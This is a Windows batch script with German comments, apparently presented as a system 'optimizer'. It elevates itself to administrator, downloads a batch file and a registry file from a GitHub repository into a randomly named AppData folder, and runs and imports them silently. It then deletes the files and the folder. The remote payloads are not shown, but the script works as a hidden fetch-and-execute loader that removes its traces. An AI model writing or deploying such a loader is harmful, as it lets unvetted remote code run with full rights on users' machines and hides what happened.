@echo off
setlocal enabledelayedexpansion

:: =============================
:: 1. Adminrechte prüfen
:: =============================
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

:: =============================
:: 2. Zufälligen Ordnernamen erzeugen
:: =============================
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "folderName="
for /L %%i in (1,1,10) do (
    set /a "rand=!random! %% 62"
    for %%j in (!rand!) do set "folderName=!folderName!!characters:~%%j,1!"
)

set "appDataPath=%APPDATA%\!folderName!"

:: =============================
:: 3. Ordner erstellen, falls er nicht existiert
:: =============================
if not exist "%appDataPath%" (
    mkdir "%appDataPath%"
)

:: =============================
:: 4. Dateipfade und URLs
:: =============================
set "batUrl=https://github.com/ZENZYLEovfwe/newest/raw/main/opti.bat"
set "regUrl=https://github.com/ZENZYLEovfwe/newest/raw/main/optimizter.reg"

set "batFile=%appDataPath%\opti.bat"
set "regFile=%appDataPath%\optimizter.reg"

:: =============================
:: 5. Dateien herunterladen
powershell -Command "Invoke-WebRequest -Uri '%batUrl%' -OutFile '%batFile%'" >nul 2>&1
if not exist "%batFile%" exit /b

powershell -Command "Invoke-WebRequest -Uri '%regUrl%' -OutFile '%regFile%'" >nul 2>&1
if not exist "%regFile%" exit /b

:: =============================
:: 6. Ausführen & Registry importieren
call "%batFile%" >nul 2>&1
reg import "%regFile%" >nul 2>&1

:: =============================
:: 7. Dateien löschen
del /f /q "%batFile%" >nul 2>&1
del /f /q "%regFile%" >nul 2>&1

:: =============================
:: 8. Ordner löschen
:: =============================
rd /s /q "%appDataPath%"

:: =============================
:: 9. Kleines Delay vor dem Schließen
:: =============================
timeout /t 2 >nul
exit
